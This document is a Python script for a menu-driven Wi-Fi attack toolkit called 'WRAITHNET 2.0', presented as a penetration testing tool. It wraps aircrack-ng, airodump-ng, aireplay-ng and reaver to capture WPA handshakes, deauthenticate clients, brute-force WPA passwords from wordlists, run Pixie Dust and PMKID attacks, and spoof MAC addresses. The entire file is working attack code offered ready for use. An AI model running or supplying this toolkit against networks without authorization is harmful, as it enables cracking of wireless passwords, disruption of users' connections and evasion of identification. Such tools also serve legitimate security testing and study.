import os
import subprocess
import time
from termcolor import colored
import pyfiglet

def start_monitor_mode():
    print(colored("Enabling monitor mode on wlan0...", "yellow"))
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])

def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_art = pyfiglet.figlet_format("WRAITHNET 2 . 0", font="doom")
    print(colored("===========================================================", "yellow"))
    
    print(colored(ascii_art, "yellow"))
    
    print(colored("   github: https://github.com/tisheplease", "yellow"))
    print(colored("   wi-fi penetration testing toolkit by @tisheplease", "yellow"))
    print(colored("===========================================================", "yellow"))
    print(colored("1. Enter monitor mode ", "yellow"))
    print(colored("2. Wi-Fi network scan ", "yellow"))
    print(colored("3. Scan clients and capture Handshake", "yellow"))
    print(colored("4. Deauth attack on client ", "yellow"))
    print(colored("5. WPA brute force via wordlist", "yellow"))
    print(colored("6. Pixie Dust Attack ", "yellow"))
    print(colored("7. PMKID Attack ", "yellow")) 
    print(colored("8. MAC Spoofing", "yellow"))
    print(colored("9. Exit", "yellow"))
    print(colored("===========================================================", "yellow"))
def scan_networks():
    print(colored("Scanning networks via airodump-ng...", "yellow"))
    subprocess.run(["sudo", "airodump-ng", "wlan0mon"])

def scan_clients_and_capture_handshake():
    bssid = input(colored("Enter the BSSID of the access point: ", "yellow"))
    channel = input(colored("Enter the channel (channel): ", "yellow"))
    output_file = input(colored("Enter the filename to save the handshake: ", "yellow"))
    print(colored("Scanning clients and capturing handshake...", "yellow"))
    subprocess.run(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", output_file, "wlan0mon"])

def deauth_attack():
    target_mac = input(colored("Enter the MAC address of the client to deauthenticate: ", "yellow"))
    target_ap = input(colored("Enter the MAC address of the access point: ", "yellow"))
    print(colored(f"Performing Deauth attack on {target_mac} (50 packets)...", "yellow"))
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "50", "-a", target_ap, "-c", target_mac, "wlan0mon"])

def brute_force_wpa():
    cap_file = input(colored("Enter the path to the .cap file with the handshake: ", "yellow"))
    wordlist = input(colored("Enter the path to the wordlist (e.g., rockyou.txt): ", "yellow"))
    print(colored(f"Starting brute force via aircrack-ng...", "yellow"))
    subprocess.run(["sudo", "aircrack-ng", cap_file, "-w", wordlist])

def pixie_dust_attack():
    target_ap = input(colored("Enter the BSSID of the access point for Pixie Dust attack: ", "yellow"))
    print(colored(f"Running Pixie Dust Attack on {target_ap}...", "yellow"))
    subprocess.run(["sudo", "reaver", "-i", "wlan0mon", "-b", target_ap, "-vv"])

def pmkid_attack():
    cap_file = input(colored("Enter the path to the .cap or .pcap file with PMKID: ", "yellow"))
    wordlist = input(colored("Enter the path to the wordlist (e.g., rockyou.txt): ", "yellow"))
    print(colored("Running PMKID attack via aircrack-ng...", "yellow"))
    subprocess.run(["sudo", "aircrack-ng", cap_file, "-w", wordlist])

def mac_spoofing():
    new_mac = input(colored("Enter the new MAC address: ", "yellow"))
    subprocess.run(["sudo", "ifconfig", "wlan0mon", "down"])
    subprocess.run(["sudo", "ifconfig", "wlan0mon", "hw", "ether", new_mac])
    subprocess.run(["sudo", "ifconfig", "wlan0mon", "up"])
    print(colored(f"MAC address changed to {new_mac}", "yellow"))

def exit_program():
    confirm = input(colored("Are you sure you want to exit? (y/n): ", "yellow"))
    if confirm.lower() == 'y':
        print(colored("Exiting the program...", "yellow"))
        exit()
    else:
        print(colored("Returning to the menu...", "yellow"))

def main():
    while True:
        show_menu()
        choice = input(colored("Select an option: ", "yellow"))

        if choice == "1":
            start_monitor_mode()
        elif choice == "2":
            scan_networks()
        elif choice == "3":
            scan_clients_and_capture_handshake()
        elif choice == "4":
            deauth_attack()
        elif choice == "5":
            brute_force_wpa()
        elif choice == "6":
            pixie_dust_attack()
        elif choice == "7":
            pmkid_attack()
        elif choice == "8":
            mac_spoofing()
        elif choice == "9":
            exit_program()
        else:
            print(colored("Invalid choice, try again.", "yellow"))

        input(colored("Press Enter to return to the menu...", "yellow"))


if __name__ == "__main__":
    main()

